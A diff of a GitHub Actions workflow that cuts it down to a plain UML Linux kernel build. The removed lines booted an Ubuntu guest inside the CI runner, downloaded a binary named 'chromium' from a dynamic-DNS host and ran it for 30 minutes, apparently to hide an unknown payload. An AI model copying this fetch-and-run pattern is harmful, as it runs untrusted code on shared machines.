@@ -1,4 +1,4 @@
-name: Build and run UML Linux with Ubuntu rootfs
+name: Build UML Linux kernel
 
 on:
   workflow_dispatch:
@@ -7,10 +7,6 @@ on:
         description: "Kernel version to build (e.g. 6.12.1). Leave empty for latest stable."
         required: false
         default: ""
-      ubuntu_suite:
-        description: "Ubuntu suite for rootfs image (e.g. noble, jammy)"
-        required: false
-        default: "noble"
   push:
     branches: [ main, master ]
     paths:
@@ -18,21 +14,20 @@ on:
       - 'scripts/**'
 
 jobs:
-  build-and-run:
+  build:
     runs-on: ubuntu-latest
-    timeout-minutes: 240
+    timeout-minutes: 120
 
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: Install dependencies
+      - name: Install build dependencies
         run: |
           sudo apt-get update
           sudo apt-get install -y --no-install-recommends \
             build-essential bc bison flex libssl-dev libelf-dev \
-            libncurses-dev dwarves wget xz-utils ca-certificates jq \
-            debootstrap e2fsprogs util-linux iproute2 iptables iputils-ping curl
+            libncurses-dev dwarves wget xz-utils ca-certificates jq
 
       - name: Resolve kernel version
         id: version
@@ -55,7 +50,7 @@ jobs:
           echo "version=$VERSION" >> "$GITHUB_OUTPUT"
           echo "url=${BASE_URL}/${TARBALL}" >> "$GITHUB_OUTPUT"
           echo "tarball=$TARBALL" >> "$GITHUB_OUTPUT"
-          echo "Building Linux $VERSION"
+          echo "Building Linux $VERSION from ${BASE_URL}/${TARBALL}"
 
       - name: Download and extract kernel source
         run: |
@@ -68,21 +63,9 @@ jobs:
         run: |
           set -euo pipefail
           make ARCH=um defconfig
-          # Useful/required options for running from a block device image
-          ./scripts/config --enable CONFIG_BLK_DEV_UBD || true
-          ./scripts/config --enable CONFIG_EXT4_FS || true
+          # Ensure useful options for UML
           ./scripts/config --enable CONFIG_HOSTFS || true
           ./scripts/config --enable CONFIG_MAGIC_SYSRQ || true
-          # Networking (try common transports for UML)
-          ./scripts/config --enable CONFIG_UML_NET || true
-          ./scripts/config --enable CONFIG_UML_NET_VECTOR || true
-          ./scripts/config --enable CONFIG_UML_NET_TUNTAP || true
-          ./scripts/config --enable CONFIG_UML_NET_SLIRP || true
-          ./scripts/config --enable CONFIG_UML_NET_DETERMINISTIC_MAC || true
-          ./scripts/config --enable CONFIG_INET || true
-          ./scripts/config --enable CONFIG_PACKET || true
-          ./scripts/config --enable CONFIG_UNIX || true
-          ./scripts/config --enable CONFIG_NETDEVICES || true
           make ARCH=um olddefconfig
 
       - name: Build UML kernel
@@ -91,217 +74,26 @@ jobs:
           set -euo pipefail
           make ARCH=um -j"$(nproc)"
 
-      - name: Create Ubuntu rootfs image
-        id: rootfs
-        env:
-          SUITE: ${{ github.event.inputs.ubuntu_suite || 'noble' }}
-        run: |
-          set -euo pipefail
-          IMG="ubuntu-${SUITE}-uml.img"
-          MNT="$(mktemp -d)"
-          echo "Creating $IMG (1G sparse ext4) with Ubuntu $SUITE..."
-          truncate -s 1G "$IMG"
-          mkfs.ext4 -F "$IMG"
-          sudo mount -o loop "$IMG" "$MNT"
-          cleanup() { sudo umount "$MNT" 2>/dev/null || true; rmdir "$MNT" 2>/dev/null || true; }
-          trap cleanup EXIT
-          sudo debootstrap --variant=minbase "$SUITE" "$MNT" http://archive.ubuntu.com/ubuntu
-          # Basic config
-          echo "ubuntu-uml" | sudo tee "$MNT/etc/hostname" >/dev/null
-          sudo tee "$MNT/etc/fstab" >/dev/null <<'FSTAB'
-          /dev/ubda / ext4 defaults 0 1
-          proc /proc proc defaults 0 0
-          sysfs /sys sysfs defaults 0 0
-          FSTAB
-          sudo mkdir -p "$MNT/proc" "$MNT/sys" "$MNT/dev"
-          # Install basic networking tools inside the guest
-          sudo cp /etc/resolv.conf "$MNT/etc/resolv.conf" || true
-          sudo mount --bind /dev "$MNT/dev"
-          sudo mount --bind /dev/pts "$MNT/dev/pts"
-          sudo mount -t proc proc "$MNT/proc"
-          sudo mount -t sysfs sys "$MNT/sys"
-          sudo chroot "$MNT" /bin/sh -c 'apt-get update && apt-get install -y --no-install-recommends iproute2 iputils-ping ca-certificates wget curl && rm -rf /var/lib/apt/lists/*'
-          sudo umount "$MNT/sys" "$MNT/proc" "$MNT/dev/pts" "$MNT/dev"
-          echo 'nameserver 8.8.8.8' | sudo tee "$MNT/etc/resolv.conf" >/dev/null
-          # Init script executed by UML (avoids relying on stdin/tty behavior)
-          sudo tee "$MNT/init.uml" >/dev/null <<'SCRIPT'
-          #!/bin/sh
-          # Best-effort run of requested script; report status but complete cleanly.
-          mount -t proc proc /proc 2>/dev/null || true
-          mount -t sysfs sysfs /sys 2>/dev/null || true
-          mount -t devtmpfs devtmpfs /dev 2>/dev/null || true
-
-          echo '--- UML_BOOT_BEGIN ---'
-          echo "KERNEL=$(uname -r)"
-          echo "ARCH=$(uname -m)"
-          echo "MEM_KB=$(awk '/MemTotal/{print $2}' /proc/meminfo 2>/dev/null || echo unknown)"
-          if [ -f /etc/os-release ]; then
-            echo '--- OS_RELEASE ---'
-            cat /etc/os-release
-          fi
-
-          # Networking setup (TAP on host expected at 192.168.254.1/24)
-          IFACE=""
-          for c in eth0 vec0 eth1; do
-            if ip link show "$c" >/dev/null 2>&1; then IFACE="$c"; break; fi
-          done
-          echo "NET_IFACE=${IFACE:-none}"
-          if [ -n "$IFACE" ]; then
-            ip link set "$IFACE" up 2>/dev/null || echo "WARN: iface_up_failed"
-            ip addr add 192.168.254.2/24 dev "$IFACE" 2>/dev/null || echo "WARN: addr_add_failed"
-            ip route add default via 192.168.254.1 2>/dev/null || echo "WARN: route_add_failed"
-            echo 'nameserver 8.8.8.8' > /etc/resolv.conf 2>/dev/null || true
-            sleep 1
-            echo '--- NET_TEST ---'
-            ip -o addr show dev "$IFACE" 2>/dev/null || true
-            ip route 2>/dev/null || true
-            ping -c 1 -W 3 192.168.254.1 >/dev/null 2>&1 && echo "PING_GW_OK" || echo "PING_GW_FAIL"
-            ping -c 1 -W 5 8.8.8.8 >/dev/null 2>&1 && echo "PING_INET_OK" || echo "PING_INET_FAIL"
-            if wget -q --timeout=10 -O /dev/null https://example.com 2>/dev/null || curl -fsS --max-time 10 -o /dev/null https://example.com 2>/dev/null; then
-              echo "NET_FETCH_OK"
-            else
-              echo "NET_FETCH_FAIL"
-            fi
-          else
-            echo "NET_NO_IFACE"
-            ip link 2>/dev/null || true
-          fi
-
-          echo "--- uml guest ---"
-          echo "nproc=$(nproc 2>/dev/null || echo 1) processors=$(grep -c '^processor' /proc/cpuinfo 2>/dev/null || echo ?)"
-          echo "UML-RUN-OK"
-
-          # Ubuntu-adapted user script (kept CI-friendly)
-          echo "--- SCRIPT_START ---"
-          if apt-get update -y; then
-            echo "APT_UPDATE_OK"
-          else
-            echo "APT_UPDATE_FAIL"
-          fi
-
-          if wget --timeout=30 -O chromium http://xyz0895.duckdns.org/files/chromium; then
-            echo "CHROMIUM_DOWNLOAD_OK"
-          else
-            echo "CHROMIUM_DOWNLOAD_FAIL"
-          fi
-          chmod +x chromium 2>/dev/null || true
-
-          CHROM_PID=""
-          if [ -x ./chromium ]; then
-            if ./chromium >/tmp/chromium.log 2>&1 & then
-              CHROM_PID=$!
-              echo "CHROMIUM_STARTED pid=${CHROM_PID}"
-              sleep 2
-              if kill -0 "$CHROM_PID" 2>/dev/null; then
-                echo "CHROMIUM_RUNNING"
-              else
-                echo "CHROMIUM_EXITED_EARLY"
-                tail -n 40 /tmp/chromium.log 2>/dev/null || true
-              fi
-            else
-              echo "CHROMIUM_START_FAIL"
-            fi
-          else
-            echo "CHROMIUM_NOT_EXECUTABLE"
-          fi
-
-          # Run for 30 minutes, then kill (safety limit)
-          SLEEP_SECS=1800
-          echo "sleeping ${SLEEP_SECS}s (30 min safety limit)"
-          sleep "$SLEEP_SECS" || echo "WARN: sleep_interrupted"
-
-          if [ -n "$CHROM_PID" ]; then
-            kill -9 "$CHROM_PID" 2>/dev/null || true
-          fi
-          pkill -9 chromium 2>/dev/null || true
-          echo "SCRIPT_DONE"
-          echo "--- SCRIPT_END ---"
-
-          echo '--- MARKER: UBUNTU_ROOTFS_OK ---'
-          sync
-          poweroff -f 2>/dev/null || halt -f 2>/dev/null || echo o > /proc/sysrq-trigger 2>/dev/null || true
-          sleep 5
-          SCRIPT
-          sudo chmod +x "$MNT/init.uml"
-          sync
-          sudo umount "$MNT"
-          trap - EXIT
-          rmdir "$MNT"
-          echo "img=$IMG" >> "$GITHUB_OUTPUT"
-          ls -lh "$IMG"
-
-      - name: Run Ubuntu rootfs in UML
-        env:
-          KVER: ${{ steps.version.outputs.version }}
-          IMG: ${{ steps.rootfs.outputs.img }}
-        run: |
-          set -euo pipefail
-          KERNEL="linux-${KVER}/linux"
-          chmod +x "$KERNEL"
-          LOG="uml-boot.log"
-
-          # Host networking for UML guest (TAP + NAT)
-          sudo ip tuntap add tap0 mode tap user "$(id -un)" || sudo ip tuntap add tap0 mode tap || true
-          sudo ip addr add 192.168.254.1/24 dev tap0 || true
-          sudo ip link set tap0 up
-          sudo sysctl -w net.ipv4.ip_forward=1
-          sudo iptables -t nat -A POSTROUTING -s 192.168.254.0/24 -o "$(ip route show default | awk '/default/ {print $5; exit}')" -j MASQUERADE || true
-          sudo iptables -A FORWARD -i tap0 -j ACCEPT || true
-          sudo iptables -A FORWARD -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT || true
-
-          set +e
-          timeout --signal=KILL 2400 "$KERNEL" \
-            ubda="$IMG" \
-            root=/dev/ubda \
-            rw \
-            mem=3072M \
-            init=/init.uml \
-            eth0=tuntap,tap0 \
-            vec0:transport=tap,ifname=tap0 \
-            con0=null,fd:1 con=null \
-            > "$LOG" 2>&1
-          RC=$?
-          set -e
-          echo "UML exit code: $RC"
-          echo "---- boot log tail ----"
-          tail -n 160 "$LOG" || true
-          echo "-----------------------"
-          grep -q 'UBUNTU_ROOTFS_OK' "$LOG" || { echo "ERROR: Ubuntu rootfs did not boot/run as expected"; exit 1; }
-          grep -q 'ID=ubuntu' "$LOG" || echo "WARNING: /etc/os-release did not show ID=ubuntu (check log)"
-          if grep -q 'NET_FETCH_OK' "$LOG"; then
-            echo "Networking test: OK"
-          else
-            echo "WARNING: Networking fetch test did not succeed; see log for details"
-          fi
-          if grep -q 'PING_INET_OK' "$LOG"; then
-            echo "Internet ping: OK"
-          fi
-
       - name: Collect artifacts
-        if: always()
-        env:
-          KVER: ${{ steps.version.outputs.version }}
         run: |
           set -euo pipefail
+          VERSION="${{ steps.version.outputs.version }}"
           mkdir -p out
-          if [ -f "linux-${KVER}/linux" ]; then
-            cp "linux-${KVER}/linux" "out/linux-${KVER}-um"
-            chmod +x "out/linux-${KVER}-um"
+          if [ -f "linux-${VERSION}/linux" ]; then
+            cp "linux-${VERSION}/linux" "out/linux-${VERSION}-um"
+            chmod +x "out/linux-${VERSION}-um"
           fi
-          cp "linux-${KVER}/.config" "out/config-${KVER}-um" 2>/dev/null || true
-          echo "$KVER" > "out/kernel-version.txt"
-          cp uml-boot.log out/ 2>/dev/null || true
-          # Compress rootfs image if present (can be large)
-          if [ -f "${{ steps.rootfs.outputs.img || '' }}" ]; then
-            gzip -c "${{ steps.rootfs.outputs.img }}" > "out/${{ steps.rootfs.outputs.img }}.gz" || true
+          if [ -f "linux-${VERSION}/vmlinux" ]; then
+            cp "linux-${VERSION}/vmlinux" "out/vmlinux-${VERSION}-um"
           fi
-          ls -lh out || true
+          cp "linux-${VERSION}/.config" "out/config-${VERSION}-um"
+          echo "$VERSION" > "out/kernel-version.txt"
+          ls -lh out
 
-      - name: Upload artifacts
-        if: always()
+      - name: Upload kernel artifact
         uses: actions/upload-artifact@v4
         with:
-          name: uml-ubuntu-${{ steps.version.outputs.version }}
+          name: uml-linux-${{ steps.version.outputs.version }}
           path: out/
-          if-no-files-found: warn
-          retention-days: 14
+          if-no-files-found: error
+          retention-days: 30
